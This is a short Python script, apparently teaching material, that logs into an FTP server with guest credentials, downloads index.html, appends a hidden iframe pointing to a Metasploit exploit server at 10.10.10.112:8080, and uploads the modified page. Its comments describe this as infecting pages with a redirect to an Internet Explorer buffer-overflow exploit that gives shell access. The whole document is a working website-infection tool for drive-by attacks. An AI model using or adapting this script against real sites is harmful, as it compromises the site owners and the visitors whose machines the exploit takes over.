#This script assumes you have used metasploit to host a service running an exploit on 10.10.10.112:8080
#For example... and IE memory buffer overflow that gives shell access to run commands
#The script will search a FTP for html pages and infect them with a redirect to said exploit service

import ftplib
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print'[+] Downloaded Page: ' +page
    f.write(redirect)
    f.close()
    print'[+] Injected Malicious Iframe on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page

host = '127.0.0.1'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src='+'"http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
